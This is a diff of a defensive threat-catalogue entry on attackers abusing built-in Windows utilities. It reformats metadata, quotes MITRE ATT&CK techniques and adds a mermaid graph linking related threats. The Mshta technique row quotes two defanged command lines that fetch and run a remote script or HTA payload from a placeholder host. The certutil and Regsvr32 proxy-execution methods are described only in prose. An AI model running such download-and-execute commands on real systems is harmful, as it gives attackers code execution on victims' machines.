@@ -1,14 +1,15 @@
 # Abuse of Windows Utilities
 
 ## Metadata
-
-- **UUID**: `d5039f2c-9fcc-4ba3-ad6a-da8c891ba745`
-- **Schema**: `threat::1.0`
-- **Version**: `1`
-- **Created**: `2024-10-30`
-- **Modified**: `2024-10-30`
-- **TLP**: clear (`TLP:CLEAR`)
-- **Organisation**: EC DIGIT CSOC (`56b0a0f0-b0bc-47d9-bb46-02f80ae2065a`)
+| Field | Value |
+| --- | --- |
+| UUID | `d5039f2c-9fcc-4ba3-ad6a-da8c891ba745` |
+| Schema | `threat::1.0` |
+| Version | `1` |
+| Created | `2024-10-30` |
+| Modified | `2024-10-30` |
+| TLP | clear (`TLP:CLEAR`) |
+| Organisation | EC DIGIT CSOC (`56b0a0f0-b0bc-47d9-bb46-02f80ae2065a`) |
 
 ## References
 ### Public
@@ -26,20 +27,23 @@ carry out unauthorized actions.
 **Medium** - A Medium priority incident may affect public health or safety, national security, economic security, foreign relations, civil liberties, or public confidence.
 
 ## Terrain
-> **Adversaries must have access to a Windows environment where they can execute 
+Adversaries must have access to a Windows environment where they can execute 
 built-in utilities. Limited user privileges may suffice, 
 but administrative privileges enhance the potential impact.
 
-Domains: Enterprise
-Targets: Workstations, Laptop
-Platforms: Windows**
+## Surface
+> **Windows**
+> Microsoft Windows operating systems (all versions)
+
+> **Windows::Desktop**
+> Microsoft Windows desktop editions
 
 ## Threat Assessment
 | Dimension | Assessment | Description |
 | --- | --- | --- |
 | Severity | Moderate incident | A cyber attack on a small organisation, or which poses a considerable risk to a medium-sized organisation, or preliminary indications of cyber activity against a large organisation or the government. |
-| Impact | Data Breach; Reputational Damages; Business disruption; Identity Theft | - |
-| Leverage | Elevation of privilege; Information Disclosure; Modify configuration; Software installation | - |
+| Impact | Data Breach<br>Reputational Damages<br>Business disruption<br>Identity Theft | Non-public information has been accessed from the outside, and successfully extracted.<br>Damages to the organization public view may be achieved by using directly the access gained, or indirectly with data gathered.<br>Business disruption<br>Acquisition of sufficient information and privileges to profess as a given individual, for the purpose of abusing and deceiving human trust relationships. |
+| Leverage | Elevation of privilege<br>Information Disclosure<br>Modify configuration<br>Software installation | Capacity to augment leverage over the target system by upgrading the compromised access rights<br>Threat action intending to read a file that one was not granted access to, or to read data in transit.<br>Modify configuration or services<br>Software installation or code modification |
 | Viability | Likely | Probable (probably) - 55-80% |
 | Kill Chain | Execution | Techniques that result in execution of attacker-controlled code on a local or remote system. |
 
@@ -63,3 +67,50 @@ Platforms: Windows**
 | `T1140` | [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) | Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.  One such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023)  Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.(Citation: Volexity PowerDuke November 2016) |
 | `T1218.010` | [System Binary Proxy Execution: Regsvr32](https://attack.mitre.org/techniques/T1218/010) | Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)  Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)  Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016) |
 | `T1218.005` | [System Binary Proxy Execution: Mshta](https://attack.mitre.org/techniques/T1218/005) | Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017)   Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)  Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>  They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>  Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta) |
+
+## Chaining
+```mermaid
+flowchart LR
+subgraph "Execution"
+d5039f2c_9fcc_4ba3_ad6a_da8c891ba745{{"Abuse of Windows<br>Utilities"}}
+767f10bd_1947_44e3_b999_5fbf50d99027{{"Abuse of mshta"}}
+86f62c3a_6556_4a64_a9f5_a79168ad42d9{{"Abuse Windows Utilities<br>to Side-Load Malicious<br>DLLs"}}
+765be5d9_4f79_4e3d_b894_fa428f285ab5{{"Download and Execute<br>Payloads with Windows<br>Utilities"}}
+426a0ab5_66e7_4149_82b0_6357a1cf4b4b{{"Leverage Windows<br>Utilities for Proxy<br>Execution of Malicious<br>Code"}}
+d5892ae6_d022_4ac8_858c_c2756067cdac{{"Malicious Code Execution<br>with Windows Utilities"}}
+596d294a_9aa8_41b2_9507_5c9d605de6b4{{"Use Windows utilities to<br>manipulate a local<br>account or group"}}
+e3d7cb59_7aca_4c3d_b488_48c785930b6d{{"PowerShell usage for<br>credential manipulation"}}
+06523ed4_7881_4466_9ac5_f8417e972d13{{"Using a Windows command<br>prompt for credential<br>manipulation"}}
+end
+subgraph "Persistence"
+66277f27_d57b_47f8_bc9c_b024c7cd1313{{"Abuse Windows Utilities<br>to Enable Persistence"}}
+end
+subgraph "Credential Access"
+59d2eb7f_63cd_4ac4_9608_e65663fea667{{"FileFix technique abuses<br>Windows Explorer to<br>execute commands"}}
+d0522985_6001_4e25_a5ff_2dc87bf2fee8{{"Windows credential<br>access attempt"}}
+35c76d6c_2ac7_486e_b0b7_b56f6b110bec{{"Password hash cracking<br>on Windows"}}
+end
+subgraph "Discovery"
+fd0542bd_1541_42a7_8c07_0e073a198a53{{"Network service<br>discovery"}}
+3b1026c6_7d04_4b91_ba6f_abc68e993616{{"Abusing Lolbins to<br>Enumerate Local and<br>Domain Accounts and<br>Groups"}}
+end
+subgraph "Defense Evasion"
+03cc9593_e7cf_484b_ae9c_684bf6f7199f{{"Pass the ticket using<br>Kerberos ticket"}}
+end
+767f10bd_1947_44e3_b999_5fbf50d99027 -->|implements| d5039f2c_9fcc_4ba3_ad6a_da8c891ba745
+66277f27_d57b_47f8_bc9c_b024c7cd1313 -->|implements| d5039f2c_9fcc_4ba3_ad6a_da8c891ba745
+86f62c3a_6556_4a64_a9f5_a79168ad42d9 -->|implements| d5039f2c_9fcc_4ba3_ad6a_da8c891ba745
+765be5d9_4f79_4e3d_b894_fa428f285ab5 -->|implements| d5039f2c_9fcc_4ba3_ad6a_da8c891ba745
+59d2eb7f_63cd_4ac4_9608_e65663fea667 -->|implements| d5039f2c_9fcc_4ba3_ad6a_da8c891ba745
+426a0ab5_66e7_4149_82b0_6357a1cf4b4b -->|implements| d5039f2c_9fcc_4ba3_ad6a_da8c891ba745
+d5892ae6_d022_4ac8_858c_c2756067cdac -->|implements| d5039f2c_9fcc_4ba3_ad6a_da8c891ba745
+fd0542bd_1541_42a7_8c07_0e073a198a53 -->|implements| d5039f2c_9fcc_4ba3_ad6a_da8c891ba745
+596d294a_9aa8_41b2_9507_5c9d605de6b4 -->|implements| d5039f2c_9fcc_4ba3_ad6a_da8c891ba745
+596d294a_9aa8_41b2_9507_5c9d605de6b4 -->|preceeds| e3d7cb59_7aca_4c3d_b488_48c785930b6d
+596d294a_9aa8_41b2_9507_5c9d605de6b4 -->|preceeds| 06523ed4_7881_4466_9ac5_f8417e972d13
+596d294a_9aa8_41b2_9507_5c9d605de6b4 -->|preceeds| 66277f27_d57b_47f8_bc9c_b024c7cd1313
+d0522985_6001_4e25_a5ff_2dc87bf2fee8 -->|preceeds| d5039f2c_9fcc_4ba3_ad6a_da8c891ba745
+d0522985_6001_4e25_a5ff_2dc87bf2fee8 -->|preceeds| 35c76d6c_2ac7_486e_b0b7_b56f6b110bec
+d0522985_6001_4e25_a5ff_2dc87bf2fee8 -->|preceeds| 03cc9593_e7cf_484b_ae9c_684bf6f7199f
+d0522985_6001_4e25_a5ff_2dc87bf2fee8 -->|preceeds| 3b1026c6_7d04_4b91_ba6f_abc68e993616
+```
